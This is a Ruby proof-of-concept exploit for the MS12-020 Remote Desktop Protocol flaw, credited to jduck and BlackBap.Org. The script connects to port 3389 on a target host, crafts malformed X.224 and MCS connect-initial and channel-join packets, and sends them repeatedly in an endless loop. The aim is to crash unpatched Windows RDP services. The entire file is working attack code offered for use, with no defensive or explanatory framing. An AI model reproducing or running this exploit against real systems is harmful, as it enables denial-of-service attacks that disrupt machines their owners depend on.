#!/usr/bin/env ruby
# ms12-020 PoC
# NOTE: 本测试脚本基于中国民间流传的Chinese Shit而写，并且修正了数据包不符合协议的问题
# Author: Joshua J. Drake(jduck)
# From: BlackBap.Org
# Silic Group - 技术自由 技术创新 技术共享 技术原创 技术进步

require 'socket'

def send_tpkt(sd, data)
  sd.write(make_tpkt(data))
end

def make_tpkt(data)
  [
    3,  # version
    0,  # reserved
    4 + data.length
  ].pack('CCn') + data
end

def make_x224(data)
  [ data.length ].pack('C') + data
end

def make_rdp(type, flags, data)
  [ type, flags, 4 + data.length ].pack('CCv') + data
end


host = ARGV.shift

sd = TCPSocket.new(host, 3389)
pkts1 = []

# craft connection request
rdp = make_rdp(1, 0, [ 0 ].pack('V'))
x224_1 = make_x224([
  0xe0,  # Connection request
  0,     # ??
  0,     # SRC-REF
  0      # Class : Class 0
].pack('CnnC') + rdp)

pkts1 << make_tpkt(x224_1)


# craft connect-initial
x224_2 = make_x224([
  0xf0,  # Data / Class 0
  0x80   # EOT: True / NR: 0
].pack('CC'))

# mcsCi
target_params = ""+
  #"\x02\x01\x00"+     # maxChannelIds
  "\x02\x04\x00\x00\x00\x22"+  # maxChannelIds
  "\x02\x04\x00\x00\x00\x0a"+  # maxUserIds
  "\x02\x04\x00\x00\x00\x00"+  # maxTokenIds
  "\x02\x04\x00\x00\x00\x01"+  # numPriorities
  "\x02\x04\x00\x00\x00\x00"+  # minThroughput
  "\x02\x04\x00\x00\x00\x01"+  # maxHeight
  "\x02\x02\xff\xff"+          # maxMCSPDUSize
  "\x02\x04\x00\x00\x00\x02"   # protocolVersion
min_params = ""+
  "\x02\x04\x00\x00\x00\x01"+  # maxChannelIds       
  "\x02\x04\x00\x00\x00\x01"+  # maxUserIds          
  "\x02\x04\x00\x00\x00\x01"+  # maxTokenIds         
  "\x02\x04\x00\x00\x00\x01"+  # numPriorities       
  "\x02\x04\x00\x00\x00\x00"+  # minThroughput       
  "\x02\x04\x00\x00\x00\x01"+  # maxHeight           
  "\x02\x02\x04\x20"+          # maxMCSPDUSize
  "\x02\x04\x00\x00\x00\x02"   # protocolVersion
max_params = ""+
  "\x02\x02\xff\xff"+          # maxChannelIds           
  "\x02\x02\xfc\x17"+          # maxUserIds              
  "\x02\x02\xff\xff"+          # maxTokenIds             
  "\x02\x04\x00\x00\x00\x01"+  # numPriorities           
  "\x02\x04\x00\x00\x00\x00"+  # minThroughput           
  "\x02\x04\x00\x00\x00\x01"+  # maxHeight               
  "\x02\x02\xff\xff"+          # maxMCSPDUSize
  "\x02\x04\x00\x00\x00\x02"   # protocolVersion

userdata = ""+
  # gccCCrq
  "\x00\x05\x00\x14"+
  "\x7c\x00\x01\x81\x2a\x00\x08\x00\x10\x00\x01\xc0\x00\x44\x75\x63"+"\x61\x81\x1c"+
  # clientCoreData
  "\x01\xc0"+"\xd8\x00"+  # header (type, len)
    "\x04\x00"+"\x08\x00"+ # version
    "\x80\x02"+ # desktop width
    "\xe0\x01"+ # desktop height
    "\x01\xca"+ # color depth
    "\x03\xaa"+ # SASSequence
    "\x09\x04\x00\x00" + # keyboard layout
    "\xce\x0e\x00\x00" + # client build number
    # client name
    "\x48\x00\x4f\x00\x53\x00\x54\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
    "\x04\x00\x00\x00"+ # keyboard type
    "\x00\x00\x00\x00"+ # kbd subType
    "\x0c\x00\x00\x00"+ # kbd FuncKey
    # imeFileName
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
    "\x01\xca"+ # postBeta2ColorDepth
    "\x01\x00"+ # clientProductId
    "\x00\x00\x00\x00" + # serialNumber
    "\x10\x00"+ # highColorDepth
    "\x07\x00"+ # supportedColorDepths
    "\x01\x00"+ # earlyCapabilityFlags
    # clientDigProductId -poc has: "00000-000-0000000-00000"
    "\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x2d\x00\x30\x00\x30\x00"+
    "\x30\x00\x2d\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00"+
    "\x30\x00\x2d\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x00\x00"+
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
    "\x00"+ # connectionType
    "\x00"+ # pad1octet
    "\x00\x00\x00\x00"+ # serverSelectedProtocol
    "\x04\xc0\x0c\x00"+ # desktopPhysicalWidth
    "\x0d\x00\x00\x00"+ # desktopPhysicalHeight
    "\x00\x00\x00\x00"+ # reserved
  # clientSecurityData
  "\x02\xc0"+"\x0c\x00"+ # header (type, len)
    "\x1b\x00\x00\x00"+ # encryptionMethods
    "\x00\x00\x00\x00"+ # extEncryptionMethods
  # clientNetworkData
  "\x03\xc0"+"\x2c\x00"+ # header (type, len)
    "\x03\x00\x00\x00"+ # channel count!
    # channel 0
    "rdpdr\x00\x00\x00"+ # name
    "\x00\x00\x80\x80"+  # options
    # channel 1
    "cliprdr\x00"+       # name
    "\x00\x00\xa0\xc0"+  # options
    # channel 2
    "rdpsnd\x00\x00"+    # name
    "\x00\x00\x00\xc0"   # options
  # clientClusterData (not present)
  # clientMonitorData (not present)

mcs_data = ""+
    "\x04\x01\x01"+ # callingDomainSelector
    "\x04\x01\x01"+ # calledDomainSelector
    "\x01\x01\xff"+ # upwardFlag
  #"\x30" + [ target_params.length ].pack('C') + target_params +
  #"\x30" + [ min_params.length ].pack('C') + min_params +
  #"\x30" + [ max_params.length ].pack('C') + max_params +
  "\x30" + [ 0x19 ].pack('C') + target_params +
  "\x30" + [ 0x19 ].pack('C') + min_params +
  "\x30" + [ 0x1c ].pack('C') + max_params +
  # userData
  "\x04\x82" + [ userdata.length ].pack('n') + userdata

#mcs = "\x7f\x65\x82" + [ mcs_data.length ].pack('n')  # connect-initial (0x65 / 101), length
mcs = "\x7f\x65\x82" + [ 0x194 ].pack('n')  # connect-initial (0x65 / 101), length
mcs << mcs_data

pkts1 << make_tpkt(x224_2 + mcs)


# send a special one?
pkts1 << make_tpkt(x224_2 + "\x04\x01\x00\x01\x00")

# send more pkts! - based on poc
10.times {
  pkts1 << make_tpkt(x224_2 + "\x28")
}

pkts1 << make_tpkt(x224_2 + "\x38\x00\x06\x03\xea")
pkts1 << make_tpkt(x224_2 + "\x38\x00\x06\x03\xeb")
pkts1 << make_tpkt(x224_2 + "\x38\x00\x06\x03\xec")
pkts1 << make_tpkt(x224_2 + "\x38\x00\x06\x03\xed")
pkts1 << make_tpkt(x224_2 + "\x38\x00\x06\x03\xee")
pkts1 << make_tpkt(x224_2 + "\x38\x00\x06\x03\xf0")
pkts1 << make_tpkt(x224_2 + "\x38\x00\x06\x03\xf1")
pkts1 << make_tpkt(x224_2 + "\x38\x00\x06\x03\xf2")
pkts1 << make_tpkt(x224_2 + "\x38\x00\x06\x03\xf3")

pkts1 << make_tpkt(x224_2 + "\x21\x80")

bigpkt = pkts1.join('')

loop {
  sd.write(bigpkt)

  send_tpkt(sd, x224_2 + "\x2e\x00\x00\x01")
  send_tpkt(sd, x224_2 + "\x2e\x00\x00\x02")
  send_tpkt(sd, x224_2 + "\x2e\x00\x00\x03")
  send_tpkt(sd, x224_2 + "\x2e\x00\x00\x04")

  # read connect-initial response
  buf = sd.recv(1500)
  # XXX: TODO: check response =)
  #puts buf
}
sd.close
# BlackBap.Org